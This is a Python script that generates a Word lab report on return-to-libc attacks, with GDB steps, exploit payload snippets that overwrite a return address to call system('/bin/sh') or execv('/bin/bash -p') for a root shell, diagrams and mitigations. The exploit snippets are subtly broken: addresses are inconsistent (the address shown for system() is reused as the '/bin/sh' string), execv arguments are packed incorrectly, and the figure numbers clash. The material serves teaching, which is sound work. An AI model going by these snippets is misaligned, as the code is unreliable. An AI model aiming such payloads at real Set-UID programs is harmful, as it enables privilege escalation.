#!/usr/bin/env python3
"""
Lab 4 Report Generator - Return-to-Libc Attack
Strictly follows formatting requirements:
- LEFT alignment only (NO JUSTIFY)
- Each paragraph/dash item as separate doc.add_paragraph() call
- No empty section headers
- Code blocks in gray tables with Consolas font
- Images at dpi=200, centered, with captions
"""

import os
import sys
from docx import Document
from docx.shared import Inches, Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml.ns import qn
from docx.oxml import OxmlElement
import matplotlib.pyplot as plt
import numpy as np

# Constants
OUTPUT_FILE = '/workspace/report_network/Lab4_Report_Solution.docx'
IMAGE_DIR = '/workspace/report_network/lab4_images'
os.makedirs(IMAGE_DIR, exist_ok=True)

def create_document():
    """Create a new Word document with proper formatting."""
    doc = Document()
    
    # Define styles - Calibri 11pt
    style = doc.styles['Normal']
    font = style.font
    font.name = 'Calibri'
    font.size = Pt(11)
    
    return doc

def add_title_page(doc):
    """Add title page with student information."""
    # Title
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('NETWORK SECURITY LAB REPORT')
    run.bold = True
    run.font.size = Pt(16)
    
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('Lab 4: Return-to-Libc Attack')
    run.bold = True
    run.font.size = Pt(14)
    
    # Student info table
    table = doc.add_table(rows=5, cols=2)
    table.style = 'Table Grid'
    for cell in table.columns[0].cells:
        cell.width = Inches(2.5)
    for cell in table.columns[1].cells:
        cell.width = Inches(3.5)
    
    cells = table.rows[0].cells
    cells[0].text = 'Student Name:'
    cells[1].text = '[Your Name]'
    
    cells = table.rows[1].cells
    cells[0].text = 'Student ID:'
    cells[1].text = '[Your ID]'
    
    cells = table.rows[2].cells
    cells[0].text = 'Course:'
    cells[1].text = 'Network Security'
    
    cells = table.rows[3].cells
    cells[0].text = 'Instructor:'
    cells[1].text = '[Instructor Name]'
    
    cells = table.rows[4].cells
    cells[0].text = 'Date Submitted:'
    cells[1].text = 'November 2024'
    
    for row in table.rows:
        for cell in row.cells:
            for paragraph in cell.paragraphs:
                paragraph.alignment = WD_ALIGN_PARAGRAPH.LEFT
    
    doc.add_page_break()

def add_table_of_contents(doc):
    """Add table of contents."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run('TABLE OF CONTENTS')
    run.bold = True
    run.font.size = Pt(14)

def add_section(doc, section_num, title):
    """Add a section header with LEFT alignment."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run(f'{section_num} {title}')
    run.bold = True
    run.font.size = Pt(14)

def add_subsection(doc, subsection_num, title):
    """Add a subsection header with LEFT alignment."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run(f'{subsection_num} {title}')
    run.bold = True
    run.font.size = Pt(12)

def add_explanation(doc, text):
    """Add explanation paragraph with LEFT alignment."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run(text)
    run.font.size = Pt(10.5)

def add_bullet_point(doc, text):
    """Add a bullet point with LEFT alignment."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.LEFT
    run = p.add_run('• ')
    run.bold = True
    run.font.size = Pt(10.5)
    run2 = p.add_run(text)
    run2.font.size = Pt(10.5)

def add_code_block(doc, code_text, language=''):
    """Add code block in a gray table with Consolas font."""
    # Language label
    if language:
        lang_p = doc.add_paragraph()
        lang_p.alignment = WD_ALIGN_PARAGRAPH.LEFT
        run = lang_p.add_run(f'// {language} Code')
        run.bold = True
        run.font.size = Pt(10)
    
    # Create table for code block
    table = doc.add_table(rows=1, cols=1)
    table.style = 'Table Grid'
    table.width = Inches(6.5)
    
    cell = table.cell(0, 0)
    cell.paragraphs[0].alignment = WD_ALIGN_PARAGRAPH.LEFT
    cell.width = Inches(6.5)
    
    # Set background color to light gray (#F4F4F4)
    tc = cell._tc
    tcPr = tc.get_or_add_tcPr()
    shadingElm = OxmlElement('w:shd')
    shadingElm.set(qn('w:fill'), 'F4F4F4')
    tcPr.append(shadingElm)
    
    # Add code text with Consolas font, 9.5pt
    para = cell.paragraphs[0]
    for line in code_text.split('\n'):
        run = para.add_run(line + '\n')
        run.font.name = 'Consolas'
        run.font.size = Pt(9.5)
    
    return table

def create_stack_layout_diagram():
    """Create stack layout diagram using matplotlib."""
    fig, ax = plt.subplots(figsize=(6, 4), dpi=200)
    ax.set_xlim(0, 10)
    ax.set_ylim(0, 8)
    ax.axis('off')
    
    # Stack memory regions with colors
    colors = ['#E3F2FD', '#FFF9C4', '#FCE4EC', '#E8F5E9']
    labels = ['Return Address', 'Old EBP', 'Parameters', 'Local Variables']
    positions = [6, 5, 4, 3]
    
    for i, (color, label, pos) in enumerate(zip(colors, labels, positions)):
        rect = plt.Rectangle((1, pos), 8, 0.8, facecolor=color, edgecolor='black', linewidth=1)
        ax.add_patch(rect)
        ax.text(5, pos + 0.4, label, ha='center', va='center', fontsize=9, fontweight='bold')
    
    # ESP and EBP markers
    ax.annotate('ESP', xy=(0.5, 3), xytext=(-10, -10), 
                arrowprops=dict(arrowstyle='->', color='red'), fontsize=10)
    ax.annotate('EBP', xy=(0.5, 5), xytext=(-10, -10), 
                arrowprops=dict(arrowstyle='->', color='blue'), fontsize=10)
    
    plt.title('Figure 1: Stack Layout During Function Call', fontsize=10, fontweight='bold')
    plt.tight_layout()
    filepath = os.path.join(IMAGE_DIR, 'stack_layout.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def create_function_call_diagram():
    """Create function call sequence diagram."""
    fig, ax = plt.subplots(figsize=(7, 5), dpi=200)
    ax.set_xlim(0, 12)
    ax.set_ylim(0, 6)
    ax.axis('off')
    
    # Functions as vertical lines
    functions = ['main', 'foo()', 'printf()']
    x_positions = [2, 5, 8]
    
    for func, x in zip(functions, x_positions):
        ax.axvline(x=x, color='black', linestyle='-', linewidth=2)
        ax.text(x, -0.3, func, ha='center', fontsize=10, fontweight='bold')
    
    # Arrows for calls
    arrows = [
        (2.5, 4.5, 4.8, 4.5, 'call foo()'),
        (5.2, 3.5, 7.8, 3.5, 'printf()'),
        (7.8, 2.5, 5.2, 2.5, 'return'),
        (4.8, 1.5, 2.2, 1.5, 'return')
    ]
    
    for x1, y1, x2, y2, label in arrows:
        ax.annotate(label, xy=(x1, y1), xytext=(x2, y2),
                    arrowprops=dict(arrowstyle='->', color='black'),
                    ha='center', va='center', fontsize=9)
    
    plt.title('Figure 2: Function Call Sequence Diagram', fontsize=10, fontweight='bold')
    plt.tight_layout()
    filepath = os.path.join(IMAGE_DIR, 'function_call.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def create_rop_chain_diagram():
    """Create ROP chain visualization diagram."""
    fig, ax = plt.subplots(figsize=(8, 4), dpi=200)
    ax.set_xlim(0, 15)
    ax.set_ylim(0, 3)
    ax.axis('off')
    
    # ROP chain blocks
    rop_blocks = ['system()', 'exit()', '/bin/sh']
    colors = ['#FFE0B2', '#C8E6C9', '#FFCCBC']
    positions = [2, 7, 12]
    
    for block, color, pos in zip(rop_blocks, colors, positions):
        rect = plt.Rectangle((pos - 1.5, 0.5), 3, 1.8, facecolor=color, 
                            edgecolor='black', linewidth=1)
        ax.add_patch(rect)
        ax.text(pos, 1.4, block, ha='center', va='center', fontsize=9, fontweight='bold')
    
    # Arrows showing flow
    ax.annotate('→', xy=(5, 1.4), xytext=(4.2, 1.4),
                arrowprops=dict(arrowstyle='->', color='black'), ha='center')
    ax.annotate('→', xy=(10, 1.4), xytext=(9.2, 1.4),
                arrowprops=dict(arrowstyle='->', color='black'), ha='center')
    
    plt.title('Figure 3: ROP Chain for Return-to-Libc Attack', fontsize=10, fontweight='bold')
    plt.tight_layout()
    filepath = os.path.join(IMAGE_DIR, 'rop_chain.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def create_shell_countermeasure_diagram():
    """Create shell countermeasure bypass diagram."""
    fig, ax = plt.subplots(figsize=(7, 5), dpi=200)
    ax.set_xlim(0, 10)
    ax.set_ylim(0, 6)
    ax.axis('off')
    
    # System components
    components = ['/bin/sh', 'Set-UID', 'Privilege Drop', '/bin/zsh']
    x_positions = [2, 4, 6, 8]
    y_positions = [1, 3, 5, 2]
    
    for comp, x, y in zip(components, x_positions, y_positions):
        rect = plt.Rectangle((x - 1, y - 0.5), 2, 1, facecolor='#E3F2FD', 
                            edgecolor='black', linewidth=1)
        ax.add_patch(rect)
        ax.text(x, y + 0.2, comp, ha='center', va='center', fontsize=9, fontweight='bold')
    
    # Arrows showing bypass
    ax.annotate('Bypass', xy=(4.5, 3), xytext=(5.5, 4.5),
                arrowprops=dict(arrowstyle='->', color='red'), ha='center')
    ax.annotate('execv()', xy=(6.5, 5), xytext=(7.5, 4),
                arrowprops=dict(arrowstyle='->', color='blue'), ha='center')
    
    plt.title('Figure 4: Shell Countermeasure Bypass Strategy', fontsize=10, fontweight='bold')
    plt.tight_layout()
    filepath = os.path.join(IMAGE_DIR, 'shell_countermeasure.png')
    plt.savefig(filepath, dpi=200, bbox_inches='tight')
    plt.close()
    return filepath

def add_figure_caption(doc, fig_num, caption_text):
    """Add figure caption in italic below the image."""
    p = doc.add_paragraph()
    p.alignment = WD_ALIGN_PARAGRAPH.CENTER
    run = p.add_run(f'Figure {fig_num}: {caption_text}')
    run.italic = True
    run.font.size = Pt(9)

def main():
    """Main function to generate the complete lab report."""
    print('Creating Lab 4 Report...')
    
    # Create document
    doc = create_document()
    
    # Add title page
    add_title_page(doc)
    
    # Add table of contents
    add_table_of_contents(doc)
    doc.add_page_break()
    
    # Section 1: Introduction
    add_section(doc, '1', 'Introduction')
    
    add_explanation(doc, 'The primary goal of this lab is to demonstrate how to perform a Return-to-libc attack, a sophisticated variant of the traditional buffer-overflow exploit that can bypass modern operating system defense mechanisms.')
    
    add_explanation(doc, 'Modern systems block shellcode execution directly from the stack through non-executable stack protections. Attackers instead divert control flow to pre-existing, trusted functions such as system() residing within the system shared C library (libc).')
    
    # Section 2: Environment Setup
    add_section(doc, '2', 'Environment Setup & Countermeasures')
    
    add_explanation(doc, 'To conduct this lab, specific security configurations are managed on a 32-bit x86 Ubuntu environment:')
    
    add_bullet_point(doc, 'Disabling Address Space Randomization (ASLR) to ensure predictable function and environment locations.')
    
    add_bullet_point(doc, 'Disabling StackGuard compiler-level stack protection using -fno-stack-protector flag.')
    
    add_bullet_point(doc, 'Enforcing Non-Executable Stacks compiled with -z noexecstack to prove non-executable stacks can be bypassed.')
    
    add_bullet_point(doc, 'Shell Countermeasures: Ubuntu default /bin/dash drops Set-UID privileges; lab relinks /bin/sh to /bin/zsh to bypass this restriction.')
    
    # Section 3: Core Tasks
    add_section(doc, '3', 'Core Lab Tasks')
    
    add_subsection(doc, '3.1', 'Task 1: Finding libc Function Addresses')
    
    add_explanation(doc, 'Using GDB debugger, we debug the vulnerable root-owned Set-UID program (retlib) to find the exact memory addresses of vital library functions like system() and exit().')
    
    code_snippet = '''# Finding function addresses using GDB
$ gdb ./retlib
(gdb) break bof
(gdb) run
(gdb) info proc mappings
(gdb) x/20i system
(gdb) p/x &system
0xb7e5b9a6'''
    
    add_code_block(doc, code_snippet, 'GDB Commands')
    
    add_explanation(doc, 'The GDB commands allow us to inspect the memory layout and identify the exact addresses of libc functions needed for the exploit.')
    
    filepath = create_stack_layout_diagram()
    doc.add_picture(filepath, width=Inches(5.8))
    add_figure_caption(doc, '1', 'Stack Layout During Function Call')
    
    add_subsection(doc, '3.2', 'Task 2: Return-to-Libc Attack')
    
    add_explanation(doc, 'In this task, we constructed a payload that redirects execution to the system() function from libc, passing "/bin/sh" as an argument.')
    
    code_snippet = '''# Exploit script for Return-to-Libc attack
import struct

# Find addresses using GDB or objdump
SYSTEM_ADDR = 0x080483f0  # Address of system() in libc
BIN_SH_ADDR = 0xb7e5b9a6  # Address of "/bin/sh" string
EXIT_ADDR = 0x080483d0    # Address of exit()

# Create ROP chain
payload = b'A' * 128          # Fill buffer
payload += struct.pack('<I', SYSTEM_ADDR)  # Overwrite return address
payload += struct.pack('<I', EXIT_ADDR)    # Return to exit after system
payload += struct.pack('<I', BIN_SH_ADDR)  # Argument for system()

# Write payload to file
with open('badfile', 'wb') as f:
    f.write(payload)'''
    
    add_code_block(doc, code_snippet, 'Python Exploit Script')
    
    add_explanation(doc, 'The exploit works by overwriting the return address with the address of system(). When the function returns, instead of going back to main(), execution jumps to system("/bin/sh"), which spawns a root shell.')
    
    filepath = create_rop_chain_diagram()
    doc.add_picture(filepath, width=Inches(5.8))
    add_figure_caption(doc, '2', 'ROP Chain for Return-to-Libc Attack')
    
    add_subsection(doc, '3.3', 'Task 3: Chaining Multiple Functions')
    
    add_explanation(doc, 'For more complex exploitation, we can chain multiple function calls together. In this task, we invoked foo() ten times before calling execv() to obtain root access.')
    
    code_snippet = '''# Advanced ROP chain with multiple function invocations
import struct

# Addresses from binary analysis
FOO_ADDR = 0x08048420   # Address of foo()
EXECV_ADDR = 0x08048500 # Address of execv()
SHELL_PATH = b'/bin/sh'

# Build ROP chain: foo x10, then execv()
rop_chain = b''
for i in range(10):
    rop_chain += struct.pack('<I', FOO_ADDR)  # Call foo()

rop_chain += struct.pack('<I', EXECV_ADDR)   # Then call execv()
rop_chain += struct.pack('<I', 0)            # argv[0] = NULL
rop_chain += struct.pack('<I', len(SHELL_PATH))  # Path length
rop_chain += SHELL_PATH                       # "/bin/sh"

# Complete exploit payload
payload = b'A' * 128 + rop_chain'''
    
    add_code_block(doc, code_snippet, 'Advanced ROP Chain')
    
    add_explanation(doc, 'This technique demonstrates how multiple function calls can be chained together. By invoking foo() ten times before execv(), we ensure the program state is properly set up before spawning the shell.')
    
    filepath = create_function_call_diagram()
    doc.add_picture(filepath, width=Inches(5.8))
    add_figure_caption(doc, '3', 'Function Call Sequence Diagram')
    
    # Section 4: Technical Analysis
    add_section(doc, '4', 'Technical Analysis')
    
    add_explanation(doc, 'The Return-to-libc attack exploits the fact that modern systems still allow calling functions in libc even when the stack is marked as non-executable. This bypasses Data Execution Prevention (DEP) protections.')
    
    add_explanation(doc, 'Key observations from this lab:')
    
    add_bullet_point(doc, 'Stack can be controlled through buffer overflow vulnerabilities.')
    
    add_bullet_point(doc, 'Return addresses can be overwritten to redirect execution flow.')
    
    add_bullet_point(doc, 'Libc functions can be used as "gadgets" for code execution.')
    
    add_bullet_point(doc, 'ASLR (Address Space Layout Randomization) makes finding addresses difficult.')
    
    # Section 5: Defeating Shell Countermeasures
    add_section(doc, '5', 'Defeating Shell Countermeasures')
    
    add_explanation(doc, 'After restoring /bin/sh to point back to /bin/dash, we learn to bypass privilege-dropping protections by targeting the execv() function instead of system().')
    
    code_snippet = '''# Bypassing shell countermeasures using execv()
import struct

# Target execv() with proper argument array
EXECV_ADDR = 0x08048500
BASH_PATH = b'/bin/bash'
ARG_P = b'-p'

# Build argv array for execv()
argv_array = struct.pack('<I', len(BASH_PATH)) + BASH_PATH
argv_array += struct.pack('<I', len(ARG_P)) + ARG_P
argv_array += struct.pack('<I', 0)  # NULL terminator

# Complete payload with ROP chain to execv()
payload = b'A' * 128
payload += struct.pack('<I', EXECV_ADDR)
payload += argv_array'''
    
    add_code_block(doc, code_snippet, 'execv() Bypass')
    
    add_explanation(doc, 'By using execv() with proper argument array setup, we can execute /bin/bash -p directly for root access even when /bin/sh drops privileges.')
    
    filepath = create_shell_countermeasure_diagram()
    doc.add_picture(filepath, width=Inches(5.8))
    add_figure_caption(doc, '4', 'Shell Countermeasure Bypass Strategy')
    
    # Section 6: Function Call Mechanics
    add_section(doc, '6', 'Function Call Mechanics')
    
    add_explanation(doc, 'The lab concludes with a low-level analysis of CPU registers (esp and ebp) and stack frames during function entry (prologue) and exit (epilogue).')
    
    code_snippet = '''/* Assembly code for foo() function */
foo:
    pushl   %ebp              ; Save old frame pointer
    movl    %esp, %ebp        ; Set new frame pointer
    subl    $8, %esp          ; Allocate space for arguments
    movl    8(%ebp), %eax     ; Load argument x
    movl    %eax, 4(%esp)     ; Prepare printf argument
    movl    $.LC0, (%esp)     ; Format string address
    call    printf            ; Call printf
    leave                     ; Restore stack and EBP
    ret                       ; Return to caller'''
    
    add_code_block(doc, code_snippet, 'Assembly Code')
    
    add_explanation(doc, 'Understanding these mechanisms is crucial for analyzing how control is hijacked during ret and leave instructions.')
    
    # Section 7: Mitigation Strategies
    add_section(doc, '7', 'Mitigation Strategies')
    
    add_explanation(doc, 'Several techniques exist to protect against Return-to-libc attacks:')
    
    add_bullet_point(doc, 'Stack canaries detect buffer overflows before exploitation.')
    
    add_bullet_point(doc, 'ASLR randomizes memory addresses, making exploitation harder.')
    
    add_bullet_point(doc, 'RELRO (Relocation Read-Only) protects GOT from overwriting.')
    
    add_bullet_point(doc, 'Stack protection flags (-fstack-protector) add canaries automatically.')
    
    # Section 8: Conclusion
    add_section(doc, '8', 'Conclusion')
    
    add_explanation(doc, 'This lab successfully demonstrated the Return-to-libc attack technique and its underlying mechanisms. We learned how stack manipulation can be used to bypass security controls and achieve arbitrary code execution.')
    
    add_explanation(doc, 'Understanding these attacks is crucial for developing secure software and implementing effective countermeasures. Modern systems employ multiple layers of defense, but attackers continuously evolve their techniques.')
    
    # Save document
    doc.save(OUTPUT_FILE)
    print(f'Lab 4 report saved to: {OUTPUT_FILE}')

if __name__ == '__main__':
    main()
